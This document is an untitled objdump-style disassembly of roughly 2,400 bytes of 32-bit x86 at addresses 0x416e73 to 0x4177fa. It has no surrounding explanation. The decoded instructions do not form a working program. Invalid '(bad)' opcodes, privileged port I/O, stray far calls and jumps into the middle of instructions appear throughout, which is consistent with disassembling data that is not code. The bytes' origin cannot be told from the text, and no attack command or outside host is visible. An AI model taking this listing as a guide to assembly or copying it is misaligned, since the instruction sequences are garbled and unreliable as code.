  416e73:	fadd   QWORD PTR [ebp+0xc]
  416e76:	dec    ebx
  416e77:	mov    edx,0xfa5d089f
  416e7c:	sti    
  416e7d:	push   ds
  416e7e:	ret    0x9ae2
  416e81:	gs pop eax
  416e83:	cli    
  416e84:	mov    cl,0xe2
  416e86:	pop    ds
  416e87:	push   es
  416e88:	cwde   
  416e89:	ins    BYTE PTR es:[edi],dx
  416e8a:	popa   
  416e8b:	stc    
  416e8c:	test   al,0x9c
  416e8e:	sbb    al,0xcb
  416e90:	hlt    
  416e91:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416e92:	push   cs
  416e93:	outs   dx,BYTE PTR ds:[esi]
  416e94:	mov    bh,0xf5
  416e96:	seta   BYTE PTR [ebx+0x5b]
  416e9a:	sbb    ebp,DWORD PTR [ebx+0x79]
  416e9d:	loop   0x416e48
  416e9f:	mov    DWORD PTR [ebx],edi
  416ea1:	neg    DWORD PTR [eax-0x40]
  416ea4:	adc    al,0xdf
  416ea6:	in     al,0x3
  416ea8:	dec    eax
  416ea9:	(bad)  
  416eab:	lahf   
  416eac:	lods   al,BYTE PTR ds:[si]
  416eae:	aad    0x1b
  416eb0:	pop    ebx
  416eb1:	aad    0xff
  416eb3:	xchg   ebx,eax
  416eb4:	dec    esp
  416eb5:	add    DWORD PTR [ecx-0x23254fcd],edx
  416ebb:	jle    0x416f19
  416ebd:	cld    
  416ebe:	cmp    dl,BYTE PTR [eax]
  416ec0:	mov    eax,ds:0xe6204be3
  416ec5:	xchg   esp,eax
  416ec6:	es sub al,0x5
  416ec9:	mov    al,bh
  416ecb:	jl     0x416f21
  416ecd:	dec    esp
  416ece:	inc    BYTE PTR [eax]
  416ed0:	mov    ds,WORD PTR [ecx+0x1602be43]
  416ed6:	nop
  416ed7:	dec    edi
  416ed8:	cmp    eax,DWORD PTR [ecx]
  416eda:	int    0xcd
  416edc:	mov    ch,BYTE PTR [esi+eax*2]
  416edf:	add    BYTE PTR [esi+0x17],cl
  416ee2:	loopne 0x416e73
  416ee4:	fcmovb st,st(1)
  416ee6:	mov    edx,0xb3481af5
  416eeb:	or     DWORD PTR [ebx+esi*8-0x27d1c534],ebx
  416ef2:	dec    ebx
  416ef3:	bound  ebx,QWORD PTR [ebx+edi*2+0x3a]
  416ef7:	call   0x332a9b72
  416efc:	(bad)  
  416efd:	sub    al,0xd5
  416eff:	retf   0x9788
  416f02:	inc    esi
  416f03:	ins    DWORD PTR es:[edi],dx
  416f04:	ja     0x416ebe
  416f06:	lahf   
  416f07:	fsubr  QWORD PTR ds:0x6fec9ea9
  416f0d:	mov    ch,0xbc
  416f0f:	and    al,0x22
  416f11:	sbb    BYTE PTR [ecx],cl
  416f13:	push   ss
  416f14:	sub    DWORD PTR [edi],esi
  416f16:	cmp    cl,BYTE PTR [ecx-0x75]
  416f19:	ds mov bl,0x82
  416f1c:	fild   WORD PTR [edx-0x147a8435]
  416f22:	push   0xdf86e794
  416f27:	sub    al,0x9a
  416f29:	mov    bh,0xc9
  416f2b:	daa    
  416f2c:	add    BYTE PTR [ebp+0x3d],al
  416f2f:	mov    dh,0x61
  416f31:	pop    esp
  416f32:	aam    0x33
  416f34:	mov    es,WORD PTR [edx]
  416f36:	inc    eax
  416f37:	sbb    esp,DWORD PTR [ebx-0x52]
  416f3a:	imul   edx,DWORD PTR [ebx+0x670eae6a],0xf64430b2
  416f44:	ret    
  416f45:	call   0xbcec10b
  416f4a:	iret   
  416f4b:	retf   0xb570
  416f4e:	or     edx,edx
  416f50:	lods   eax,DWORD PTR ds:[esi]
  416f51:	cmp    BYTE PTR [ebx+0x849ade8],0xf1
  416f58:	push   ebx
  416f59:	shl    DWORD PTR [edi+0x44ed442b],cl
  416f5f:	dec    edi
  416f60:	mov    ah,0xd0
  416f62:	xlat   BYTE PTR ds:[ebx]
  416f63:	data16 aam 0x45
  416f66:	fcom   QWORD PTR [ebx-0x3d]
  416f69:	add    BYTE PTR [eax+0x6c4f1fd1],ch
  416f6f:	and    ch,BYTE PTR [esi]
  416f71:	aas    
  416f72:	call   0x4eac4b46
  416f77:	push   0x52
  416f79:	xor    ch,ah
  416f7b:	retf   
  416f7c:	sti    
  416f7d:	shr    BYTE PTR [ebp-0x30884198],1
  416f83:	scas   eax,DWORD PTR es:[edi]
  416f84:	(bad)  
  416f86:	push   0x6b
  416f88:	inc    esi
  416f89:	ret    
  416f8a:	daa    
  416f8b:	mov    edx,0xacda3765
  416f90:	push   ebp
  416f91:	add    esi,esi
  416f93:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416f94:	jo     0x416f40
  416f96:	mov    esp,0xb934d9e2
  416f9b:	pop    edx
  416f9c:	add    ebp,DWORD PTR [eax+0x57fa3e86]
  416fa2:	pop    esi
  416fa3:	mov    eax,0xf82fba33
  416fa8:	test   al,0x1f
  416faa:	xor    al,0xd7
  416fad:	cmp    ch,BYTE PTR [edx-0x3]
  416fb0:	cmc    
  416fb1:	cdq    
  416fb2:	nop
  416fb3:	jb     0x416fed
  416fb5:	mov    ch,0x3d
  416fb7:	sti    
  416fb8:	jns    0x416fcf
  416fba:	mov    ebx,0xb9636cd
  416fbf:	nop
  416fc0:	lds    esp,FWORD PTR [esi+0x77]
  416fc3:	dec    eax
  416fc4:	jge    0x416f4e
  416fc6:	xor    ah,ch
  416fc8:	mov    bh,0x15
  416fca:	xor    ebp,DWORD PTR [edi-0x1e]
  416fcd:	fs dec ebp
  416fcf:	sbb    esp,0xfffffffc
  416fd2:	cmp    ebp,DWORD PTR [eax-0x3749e81f]
  416fd8:	cdq    
  416fd9:	push   0x835cdb04
  416fde:	add    al,0xc
  416fe0:	repz gs xchg edx,eax
  416fe3:	out    0xd3,al
  416fe5:	ins    BYTE PTR es:[edi],dx
  416fe6:	pop    ebx
  416fe7:	hlt    
  416fe8:	add    BYTE PTR [ecx],al
  416fea:	push   esi
  416feb:	sub    ecx,DWORD PTR [edi-0x25771fbf]
  416ff1:	retf   0xd79a
  416ff4:	dec    esp
  416ff5:	pushf  
  416ff6:	add    esp,edx
  416ff8:	xor    BYTE PTR [edx-0x795f742c],0x85
  416fff:	pusha  
  417000:	inc    ebp
  417001:	adc    al,0x2f
  417003:	push   esp
  417004:	popf   
  417005:	jl     0x416f94
  417007:	scas   eax,DWORD PTR es:[edi]
  417008:	push   ebx
  417009:	xchg   esp,eax
  41700a:	rcl    ah,cl
  41700c:	xchg   bh,al
  41700e:	cmp    eax,0xcea70e26
  417013:	jecxz  0x41704a
  417015:	push   edx
  417016:	popf   
  417017:	push   0xffffffad
  417019:	and    eax,0xdd0cce12
  41701e:	outs   dx,DWORD PTR ds:[esi]
  41701f:	mov    ebx,0x6cd4c4c6
  417024:	dec    edx
  417025:	shl    BYTE PTR [ecx],0xa4
  417028:	mov    BYTE PTR [edx+0x60d23748],dh
  41702e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41702f:	test   eax,0xbc703544
  417034:	xchg   esp,eax
  417035:	fdiv   DWORD PTR [ebp-0x7eea6d2a]
  41703b:	call   FWORD PTR [esi+0x6a]
  41703e:	dec    edi
  41703f:	out    dx,eax
  417040:	outs   dx,BYTE PTR ds:[esi]
  417041:	add    bh,BYTE PTR [ecx-0x8]
  417044:	mov    cs,WORD PTR [esi-0x76]
  417047:	mov    dl,0xf9
  417049:	enter  0xcaf5,0x6d
  41704d:	xor    al,0xcb
  41704f:	retf   0x2b3c
  417052:	das    
  417053:	out    dx,al
  417054:	mov    ebx,0xa573e618
  417059:	div    BYTE PTR [esi-0x43]
  41705c:	sub    DWORD PTR [esi-0x17],0xffffffb9
  417060:	loopne 0x41706a
  417062:	rcr    DWORD PTR [edx],0xdf
  417065:	xor    eax,0xe0851c10
  41706a:	dec    eax
  41706b:	loop   0x41701f
  41706d:	adc    BYTE PTR ds:0x258ab458,ch
  417073:	je     0x4170a0
  417075:	mov    eax,ds:0x6a1fd849
  41707a:	mov    ebp,0x2327d1e5
  41707f:	jb     0x4170a5
  417081:	cmp    eax,0x153da3df
  417086:	mov    edx,0x2db53e9d
  41708b:	pop    edi
  41708c:	fs popf 
  41708e:	pop    edx
  41708f:	push   ss
  417090:	sbb    al,0xe1
  417092:	ficom  DWORD PTR [ebp+0x9]
  417095:	sub    dl,al
  417097:	mov    BYTE PTR [eax-0x49],dl
  41709a:	inc    BYTE PTR [ecx+ecx*1]
  41709d:	sahf   
  41709e:	mov    edi,0x21f03fe3
  4170a3:	(bad)  
  4170a4:	jne    0x4170d1
  4170a6:	inc    esi
  4170a7:	mov    bh,BYTE PTR [esi+0x13]
  4170aa:	push   es
  4170ab:	inc    esp
  4170ac:	push   esp
  4170ad:	es icebp 
  4170af:	in     al,0x5e
  4170b1:	loop   0x4170fa
  4170b3:	out    dx,eax
  4170b4:	jne    0x41710d
  4170b6:	enter  0x667b,0xde
  4170ba:	sahf   
  4170bb:	int3   
  4170bc:	push   esi
  4170bd:	mov    BYTE PTR [esi],ah
  4170bf:	mov    ds:0x75b34720,eax
  4170c4:	icebp  
  4170c5:	inc    edi
  4170c6:	(bad)  
  4170c7:	call   0x7d3b:0x893d4c25
  4170ce:	push   0xffffffe0
  4170d0:	imul   eax,DWORD PTR [eax],0x580dd592
  4170d6:	aas    
  4170d7:	or     al,0x5e
  4170d9:	addr16 call 0xb7b7:0x183c1908
  4170e1:	push   esp
  4170e2:	sub    eax,0xfe09120f
  4170e7:	jl     0x4170a0
  4170e9:	aam    0xec
  4170eb:	mov    ch,0x4e
  4170ed:	scas   eax,DWORD PTR es:[edi]
  4170ee:	inc    ebp
  4170ef:	dec    edi
  4170f0:	seta   BYTE PTR [edi-0x5e]
  4170f4:	mov    dh,0x3
  4170f6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4170f7:	jae    0x417167
  4170f9:	test   eax,0xf3f78ecb
  4170fe:	shl    ecx,cl
  417100:	imul   edi,DWORD PTR [edi-0x46fae9c4],0x34a6f677
  41710a:	int3   
  41710b:	pusha  
  41710c:	dec    edx
  41710d:	hlt    
  41710e:	push   ebp
  41710f:	sub    BYTE PTR [eax],0x18
  417112:	je     0x41713e
  417114:	jmp    0x41717b
  417116:	ins    DWORD PTR es:[edi],dx
  417117:	xchg   ebp,eax
  417118:	fs xchg ecx,eax
  41711a:	cmp    bh,bl
  41711c:	dec    eax
  41711d:	mov    cl,0x92
  41711f:	out    0x3e,al
  417121:	retf   
  417122:	fisub  DWORD PTR [ebx-0x7f2cbf1d]
  417128:	mov    esp,0xe6885d22
  41712d:	mov    eax,ds:0xd6f02553
  417132:	xchg   edi,eax
  417133:	pop    edi
  417134:	rcr    DWORD PTR [esi],cl
  417136:	add    WORD PTR [eax*8-0x7a58253b],cx
  41713e:	mul    ch
  417140:	mov    eax,ds:0xcfb23d5c
  417145:	dec    eax
  417146:	or     DWORD PTR [esi+ebx*4-0x39],esi
  41714a:	sbb    BYTE PTR [edi-0x60],al
  41714d:	jp     0x41710d
  41714f:	xor    DWORD PTR [edx-0x1f02aee3],eax
  417155:	scas   al,BYTE PTR es:[edi]
  417156:	js     0x417179
  417158:	test   BYTE PTR [edi*2-0x33eb2297],dl
  41715f:	xchg   ecx,eax
  417160:	test   DWORD PTR [edx+0x1af4d7f0],edx
  417166:	dec    ecx
  417167:	pop    esi
  417168:	dec    ecx
  417169:	daa    
  41716a:	push   ecx
  41716b:	div    BYTE PTR [ebp+edx*4-0x3ea8144a]
  417172:	pop    esi
  417173:	mov    BYTE PTR [esi-0x1e2e80f7],cl
  417179:	mov    WORD PTR [edx-0x52],ds
  41717c:	mov    dh,0xd5
  41717e:	icebp  
  41717f:	add    bl,BYTE PTR [ebx-0x58a0ebae]
  417185:	adc    eax,0xb71ec34d
  41718a:	(bad)  
  41718b:	lods   eax,DWORD PTR ds:[esi]
  41718c:	push   esi
  41718d:	dec    edi
  41718e:	in     al,dx
  41718f:	adc    eax,0xa1b76d
  417194:	loop   0x41715c
  417196:	(bad)  
  417197:	fnstenv [edi]
  417199:	adc    eax,0xbe5c4cc4
  41719e:	and    al,0x69
  4171a0:	mov    edi,0x15b24e8
  4171a5:	sti    
  4171a6:	mov    dh,BYTE PTR [ebp-0x73]
  4171a9:	add    al,0xf9
  4171ab:	xchg   edi,eax
  4171ac:	and    ecx,esp
  4171ae:	xor    al,0x7e
  4171b0:	js     0x4171d7
  4171b2:	nop
  4171b3:	inc    esi
  4171b4:	out    dx,al
  4171b5:	push   ecx
  4171b6:	fmul   st,st(1)
  4171b8:	pop    eax
  4171b9:	sbb    ebp,DWORD PTR [ecx-0x30]
  4171bc:	shl    BYTE PTR [eax-0x6d],cl
  4171bf:	pop    es
  4171c0:	into   
  4171c1:	aad    0x1c
  4171c3:	loope  0x41717f
  4171c5:	mov    esp,DWORD PTR [ecx]
  4171c7:	jmp    0x417206
  4171c9:	mov    ecx,0xdbd3eebd
  4171ce:	mov    al,0x97
  4171d0:	cld    
  4171d1:	fucom  st(3)
  4171d3:	test   DWORD PTR [eax-0x79],esi
  4171d6:	and    ah,cl
  4171d8:	jle    0x417200
  4171da:	pushf  
  4171db:	mov    al,0xdd
  4171dd:	les    esi,FWORD PTR [esi-0x59]
  4171e0:	ja     0x4171da
  4171e2:	or     ah,cl
  4171e4:	test   al,0x40
  4171e6:	cmp    eax,0x26205e17
  4171eb:	sub    BYTE PTR [ebp+0x23],0x8a
  4171ef:	dec    edi
  4171f0:	repz push 0x3c
  4171f3:	adc    DWORD PTR [edi+eiz*8],0xffffffea
  4171f7:	dec    esp
  4171f8:	sub    BYTE PTR [edx+ecx*4],ah
  4171fb:	sbb    esi,DWORD PTR [edx+0x3d]
  4171fe:	jge    0x417279
  417200:	fisubr WORD PTR [ebx+0x2f]
  417203:	fidiv  DWORD PTR [eax]
  417205:	dec    esi
  417206:	and    ecx,eax
  417208:	out    dx,al
  417209:	and    ecx,DWORD PTR [esi-0x7a]
  41720c:	rcl    dl,1
  41720e:	jno    0x41723c
  417210:	je     0x417225
  417212:	xor    bl,bl
  417214:	aas    
  417215:	loope  0x417247
  417217:	int    0x51
  417219:	in     eax,dx
  41721a:	inc    eax
  41721b:	(bad)  [esi+edx*8]
  41721e:	ret    0x9135
  417221:	add    bl,ch
  417223:	arpl   WORD PTR [edx-0x62],di
  417226:	mov    cl,0x90
  417228:	xchg   BYTE PTR [ecx+0x48],ch
  41722b:	ror    DWORD PTR [edi+0x4e08129c],0xa9
  417232:	xchg   esi,eax
  417233:	int3   
  417234:	inc    DWORD PTR [edx-0x39]
  417237:	outs   dx,DWORD PTR ds:[esi]
  417238:	imul   ebp,ecx,0xbf62351f
  41723e:	xor    dl,BYTE PTR [edx]
  417240:	test   al,0x18
  417242:	bound  eax,QWORD PTR [edi+0x6697d8f0]
  417248:	in     al,0xf7
  41724a:	mov    al,0xce
  41724c:	jne    0x4172b0
  41724e:	(bad)  
  41724f:	fimul  WORD PTR ds:0x201157d1
  417255:	and    esi,esi
  417257:	push   esi
  417258:	xchg   ebp,eax
  417259:	pushf  
  41725a:	inc    ecx
  41725b:	cmp    esp,DWORD PTR [eax+ebx*8-0x26]
  41725f:	pop    esp
  417260:	test   cl,dh
  417262:	dec    ecx
  417263:	add    al,0x0
  417265:	xchg   ebx,eax
  417266:	stos   BYTE PTR es:[edi],al
  417267:	test   DWORD PTR [ecx],eax
  417269:	(bad)  
  41726a:	push   edi
  41726b:	scas   eax,DWORD PTR es:[edi]
  41726c:	pushf  
  41726d:	xchg   ecx,eax
  41726e:	jnp    0x41726e
  417270:	in     al,0x6c
  417272:	mov    bh,dh
  417274:	out    dx,eax
  417275:	mov    ds:0xa4c3d70c,al
  41727a:	(bad)  
  41727b:	test   eax,0xec804861
  417280:	pop    edx
  417281:	loopne 0x4172f1
  417283:	xor    ah,cl
  417285:	xor    ebp,ebx
  417287:	xchg   ebp,eax
  417288:	or     dl,al
  41728a:	push   eax
  41728b:	cmp    ebx,DWORD PTR [ebx]
  41728d:	push   ds
  41728e:	iret   
  41728f:	pop    esp
  417290:	das    
  417291:	mov    esp,0xdfdf016c
  417296:	jne    0x4172e5
  417298:	push   esi
  417299:	pop    edi
  41729a:	or     esi,esp
  41729c:	pop    edi
  41729d:	daa    
  41729e:	adc    DWORD PTR [eax+0x20cc5def],ecx
  4172a4:	adc    eax,0x1a499edd
  4172a9:	je     0x417249
  4172ab:	cs jns 0x4172e8
  4172ae:	test   DWORD PTR [edi],esi
  4172b0:	add    eax,0xbf22505d
  4172b5:	pushf  
  4172b6:	xor    al,BYTE PTR [ebx-0x23]
  4172b9:	and    eax,0xd0626bd6
  4172be:	dec    esp
  4172bf:	out    dx,eax
  4172c0:	lahf   
  4172c1:	sahf   
  4172c2:	js     0x417253
  4172c4:	test   eax,0x9a25ec83
  4172c9:	scas   eax,DWORD PTR es:[edi]
  4172ca:	sub    DWORD PTR [ecx+0x2a3f6fc7],ebx
  4172d0:	popf   
  4172d1:	cmp    al,0x60
  4172d3:	mov    bl,0xa
  4172d5:	inc    ecx
  4172d6:	cs inc ebp
  4172d8:	lds    ebx,FWORD PTR [ecx-0x25cbd91c]
  4172de:	inc    ecx
  4172df:	and    eax,0xc28b304f
  4172e4:	and    esp,edi
  4172e6:	out    dx,al
  4172e7:	mov    WORD PTR [edx-0x7f],fs
  4172ea:	mov    edi,0xfb4095b7
  4172ef:	jl     0x417314
  4172f1:	in     eax,0xa1
  4172f3:	and    eax,0x4338baad
  4172f8:	cwde   
  4172f9:	arpl   WORD PTR [ecx-0x15],bx
  4172fc:	jge    0x41732d
  4172fe:	or     DWORD PTR [edx-0x24],eax
  417301:	loopne 0x4172ff
  417303:	cmp    eax,0x30a58731
  417308:	imul   esi,ebp,0x2b
  41730b:	sub    esp,ecx
  41730d:	jae    0x41738d
  41730f:	and    ecx,eax
  417311:	mov    eax,0xe7b58869
  417316:	jbe    0x4172a5
  417318:	cmc    
  417319:	imul   eax,esp,0x70
  41731c:	push   es
  41731d:	push   0xdfe2e846
  417322:	pop    ds
  417323:	pop    ds
  417324:	pop    ss
  417325:	or     BYTE PTR [esi+0x7a],al
  417328:	add    al,0xa5
  41732a:	cmp    eax,0xef57b754
  41732f:	call   0x9afc:0xf1983d9d
  417336:	popf   
  417337:	mov    esp,0x7a4f3d63
  41733c:	pusha  
  41733d:	xchg   ebx,eax
  41733e:	mov    DWORD PTR [esi-0x1a],0x7578418
  417345:	pop    es
  417346:	(bad)  
  417347:	arpl   WORD PTR [edi+0x39],dx
  41734a:	loopne 0x41737e
  41734c:	shl    DWORD PTR [esi+0x73907818],1
  417352:	jge    0x417345
  417354:	leave  
  417355:	pop    ebx
  417356:	stc    
  417357:	adc    edx,edi
  417359:	sbb    ecx,DWORD PTR [ebx+0x34]
  41735c:	mov    eax,0x65579762
  417361:	out    0x12,eax
  417363:	or     eax,DWORD PTR [edx-0x51]
  417366:	int3   
  417367:	daa    
  417368:	adc    bl,BYTE PTR [esp+eiz*2]
  41736b:	add    dl,BYTE PTR [ecx]
  41736d:	nop
  41736e:	ds jg  0x4172f4
  417371:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417372:	call   0xfc47:0x54978fa
  417379:	cmp    ebx,DWORD PTR [ebp+esi*2-0x7a]
  41737d:	(bad)  
  417381:	daa    
  417382:	mov    al,0xe8
  417384:	jecxz  0x4173d5
  417386:	sub    DWORD PTR [ebx+0x1b1df11c],esp
  41738c:	jp     0x41734c
  41738e:	ret    0x951e
  417391:	out    dx,eax
  417392:	imul   edx,DWORD PTR [ecx-0x26f7413c],0xffffff88
  417399:	pushf  
  41739a:	aas    
  41739b:	push   0xffffffbd
  41739d:	ror    DWORD PTR [edx],cl
  41739f:	add    al,0xc7
  4173a1:	addr16 cmp al,0x42
  4173a4:	sti    
  4173a5:	in     eax,dx
  4173a6:	mov    dh,0xee
  4173a8:	iret   
  4173a9:	adc    DWORD PTR [ecx],ebx
  4173ab:	inc    ecx
  4173ac:	int3   
  4173ad:	inc    edx
  4173ae:	mov    dl,ah
  4173b0:	stos   DWORD PTR es:[edi],eax
  4173b1:	mov    ebx,0xf11b8f31
  4173b6:	jmp    0x320a6e20
  4173bb:	dec    ecx
  4173bc:	pop    edx
  4173bd:	xor    ebp,DWORD PTR [ebp-0x7a]
  4173c0:	mov    ds:0xe9bd6660,eax
  4173c5:	push   ss
  4173c6:	xchg   DWORD PTR [edi-0x97c1e35],ebx
  4173cc:	jp     0x41743a
  4173ce:	xchg   edi,eax
  4173cf:	jne    0x417439
  4173d1:	fcom   QWORD PTR [ecx+0x22]
  4173d4:	pop    es
  4173d5:	std    
  4173d6:	push   0x6bbef239
  4173db:	xor    al,0x80
  4173dd:	mov    edi,0x20e9359d
  4173e2:	pushf  
  4173e3:	or     edi,edx
  4173e5:	retf   
  4173e6:	push   ecx
  4173e7:	jne    0x417394
  4173e9:	stos   BYTE PTR es:[edi],al
  4173ea:	jle    0x417406
  4173ec:	mov    ebp,0x3a801373
  4173f1:	push   ebp
  4173f2:	add    dh,bh
  4173f4:	test   DWORD PTR [ebx-0x4ba4f7ed],esp
  4173fa:	test   eax,0x66a28c86
  4173ff:	mov    ebp,0xe4a2e2f6
  417404:	mov    DWORD PTR [edx],ebp
  417406:	mov    eax,ds:0x4f86e668
  41740b:	loopne 0x417479
  41740d:	pop    ds
  41740e:	shl    BYTE PTR [ecx+esi*8],cl
  417411:	xchg   ebx,eax
  417412:	cmp    BYTE PTR [ebp-0x5a],bl
  417415:	int    0xd6
  417417:	fist   WORD PTR [eax]
  417419:	pusha  
  41741a:	mov    cl,0x35
  41741c:	in     al,0x4d
  41741e:	test   eax,0xf2c9610b
  417423:	mov    esi,0x9c44a781
  417428:	sub    dl,BYTE PTR [esi+0x2cf0c2cd]
  41742e:	xchg   dx,ax
  417430:	repz push edi
  417432:	jno    0x4173ca
  417434:	sub    eax,0x4f15fd38
  417439:	jge    0x417403
  41743b:	mov    dh,0xa7
  41743d:	adc    DWORD PTR [ebx],eax
  41743f:	test   al,0x71
  417441:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417442:	lods   al,BYTE PTR ds:[esi]
  417443:	(bad)  
  417444:	dec    ebp
  417445:	int    0xe0
  417447:	outs   dx,BYTE PTR ds:[esi]
  417448:	jge    0x417435
  41744a:	inc    eax
  41744b:	pusha  
  41744c:	pop    ds
  41744d:	fsubr  DWORD PTR [ebx+0x21e58b94]
  417453:	int    0x5b
  417455:	jp     0x4173f9
  417457:	test   al,0xaf
  417459:	aad    0x27
  41745b:	and    BYTE PTR [ebp*1+0x23999192],0xf1
  417463:	mov    ecx,ecx
  417465:	(bad)  
  417467:	push   edi
  417468:	test   BYTE PTR [ecx],cl
  41746a:	aam    0xb5
  41746c:	test   al,0x6b
  41746e:	add    al,0x7
  417470:	inc    eax
  417471:	sbb    BYTE PTR [esi],cl
  417473:	sbb    ebp,ebp
  417475:	mov    ch,0x27
  417477:	pop    eax
  417478:	(bad)  
  41747a:	push   ss
  41747b:	or     eax,0x7628c3ca
  417480:	cmp    al,0x63
  417482:	(bad)  [edi-0x19]
  417485:	xchg   esi,eax
  417486:	imul   edx,eax,0x10
  417489:	addr16 pop esi
  41748b:	shl    al,0x89
  41748e:	in     al,dx
  41748f:	rcl    DWORD PTR [ebp-0x61ca7ec],0xaf
  417496:	scas   al,BYTE PTR es:[edi]
  417497:	push   esi
  417498:	inc    eax
  417499:	jb     0x4174af
  41749b:	mov    esp,0xdba87e2a
  4174a0:	lods   eax,DWORD PTR ds:[esi]
  4174a1:	pop    esi
  4174a2:	int    0x57
  4174a4:	lods   al,BYTE PTR ds:[esi]
  4174a5:	(bad)  
  4174a6:	push   ds
  4174a7:	sbb    BYTE PTR ds:0x40405b1c,0x70
  4174ae:	dec    eax
  4174af:	das    
  4174b0:	push   es
  4174b1:	ss out 0xa7,al
  4174b4:	out    0x18,al
  4174b6:	push   eax
  4174b7:	inc    edi
  4174b8:	in     eax,0xd7
  4174ba:	loop   0x41753b
  4174bc:	inc    ecx
  4174bd:	mov    ds:0x9948c86,al
  4174c2:	call   0xdd91bbc9
  4174c7:	push   esp
  4174c8:	sbb    al,0x1b
  4174ca:	imul   edx,DWORD PTR [edx+eiz*8],0x8693fe91
  4174d1:	jle    0x417469
  4174d3:	mov    edx,DWORD PTR [esi]
  4174d5:	fsubr  QWORD PTR [ebp-0x6e2490ca]
  4174db:	dec    ebx
  4174dc:	repz leave 
  4174de:	fcom   DWORD PTR [esp+ecx*4+0x283a240f]
  4174e5:	add    al,0x35
  4174e7:	cmp    ch,BYTE PTR [eax]
  4174e9:	pop    edi
  4174ea:	mov    dh,0x44
  4174ec:	adc    DWORD PTR [eax],eax
	...
  4176be:	add    BYTE PTR [eax],al
  4176c0:	add    BYTE PTR [edi-0x126a5a8a],bh
  4176c6:	xlat   BYTE PTR ds:[ebx]
  4176c7:	mov    edi,0xa0a36c7e
  4176cc:	ror    dl,0x3a
  4176cf:	lock loop 0x41770d
  4176d2:	test   DWORD PTR [ecx],0x72000
  4176d8:	add    bh,bh
  4176da:	arpl   WORD PTR [ebp-0x36],bp
  4176dd:	jne    0x4176fe
  4176df:	xchg   ecx,eax
  4176e0:	mov    ebp,0x35695e38
  4176e5:	xchg   ebx,eax
  4176e6:	test   al,0xfd
  4176e8:	js     0x41766a
  4176ea:	fsub   QWORD PTR [ecx+0x6783fd54]
  4176f0:	mov    ds:0xcd92c622,al
  4176f5:	add    DWORD PTR [edx-0x1c],ebp
  4176f8:	or     DWORD PTR [esi],ecx
  4176fa:	mov    esp,0x46707323
  4176ff:	hlt    
  417700:	push   edi
  417701:	fwait
  417702:	lods   al,BYTE PTR ds:[esi]
  417703:	or     eax,0x9845910d
  417708:	call   0xba86:0x7b37784c
  41770f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417710:	test   dh,cl
  417712:	ficom  DWORD PTR [esi-0x6d]
  417715:	jge    0x4176ae
  417717:	dec    ebx
  417718:	jo     0x417732
  41771a:	pop    edi
  41771b:	sbb    eax,0xf220eb25
  417720:	sbb    al,0xaa
  417722:	mov    BYTE PTR [ecx],dh
  417724:	shl    BYTE PTR [esi+0x389b8fe5],0x32
  41772b:	scas   al,BYTE PTR es:[edi]
  41772c:	or     al,0x73
  41772e:	adc    esp,DWORD PTR ss:[esi]
  417731:	dec    edx
  417732:	push   esi
  417733:	jae    0x417799
  417735:	cmp    BYTE PTR [ecx],dh
  417737:	adc    BYTE PTR [esi+esi*1+0x59],ah
  41773b:	rcl    ebx,0x94
  41773e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41773f:	jmp    0x41770b
  417741:	in     eax,dx
  417742:	push   eax
  417743:	int3   
  417744:	jle    0x417732
  417746:	pop    edx
  417747:	pop    ss
  417748:	repz bound ebp,QWORD PTR [edi-0x277ee9d]
  41774f:	and    esp,DWORD PTR cs:[edi+0x67]
  417753:	stos   BYTE PTR es:[edi],al
  417754:	push   esi
  417755:	loope  0x4177c9
  417757:	call   DWORD PTR [eax+0x62]
  41775a:	stos   BYTE PTR es:[edi],al
  41775b:	bound  esi,QWORD PTR [edi-0xe]
  41775e:	jmp    0x14e5f2bb
  417763:	mov    ah,0x1c
  417765:	aad    0x1d
  417767:	cwde   
  417768:	sti    
  417769:	rcr    DWORD PTR [edi+0x2ab0cf16],0x20
  417770:	push   eax
  417771:	jne    0x417739
  417773:	jnp    0x4177d5
  417775:	js     0x417779
  417777:	xor    DWORD PTR [edx+0x6b],0xffffffcb
  41777b:	pushf  
  41777c:	cdq    
  41777d:	cs nop
  41777f:	lods   eax,DWORD PTR ds:[esi]
  417780:	fwait
  417781:	fs jnp 0x41774d
  417784:	fdivr  st,st(0)
  417786:	mov    edi,0x6b3fac
  41778b:	push   esi
  41778c:	jge    0x417741
  41778e:	xor    DWORD PTR [ecx+ebx*8+0x5a],esi
  417792:	out    0x35,al
  417794:	mov    bh,0xf0
  417796:	jnp    0x4177e1
  417798:	jp     0x4177a8
  41779a:	xchg   edx,eax
  41779b:	arpl   WORD PTR [edi],cx
  41779d:	jl     0x417817
  41779f:	test   BYTE PTR [ecx+0x2],cl
  4177a2:	mov    bh,0x37
  4177a4:	jns    0x417727
  4177a6:	xchg   esi,eax
  4177a7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4177a8:	add    esp,DWORD PTR [esi]
  4177aa:	mov    gs,WORD PTR [edx+esi*2+0x43]
  4177ae:	es dec edi
  4177b0:	mov    edx,0xa0c60a0d
  4177b5:	xor    dh,0x55
  4177b8:	sbb    DWORD PTR [ecx+0xa3241e],0x21
  4177bf:	daa    
  4177c0:	cmp    BYTE PTR [esp+edi*4],al
  4177c3:	je     0x4177b1
  4177c5:	aaa    
  4177c6:	js     0x41783e
  4177c8:	test   BYTE PTR [edi-0x557c309e],bh
  4177ce:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4177cf:	pop    edi
  4177d0:	xchg   ebp,eax
  4177d1:	inc    ebp
  4177d2:	(bad)  
  4177d3:	mov    ecx,0xbcc51fcc
  4177d8:	push   ebp
  4177d9:	scas   al,BYTE PTR es:[edi]
  4177da:	inc    esp
  4177db:	loopne 0x41781c
  4177dd:	sbb    BYTE PTR [ebx+edi*4-0x6e],cl
  4177e1:	and    eax,0x75b47498
  4177e6:	push   0xffffffff
  4177e8:	pop    esi
  4177e9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4177ea:	or     bl,BYTE PTR ds:0x28186c24
  4177f0:	ins    BYTE PTR es:[edi],dx
  4177f1:	movups xmm6,xmm1
  4177f4:	dec    eax
  4177f5:	pop    edi
  4177f6:	mov    al,0xbd
  4177f8:	and    edi,esp
  4177fa:	add    eax,0x4ebb7ec2
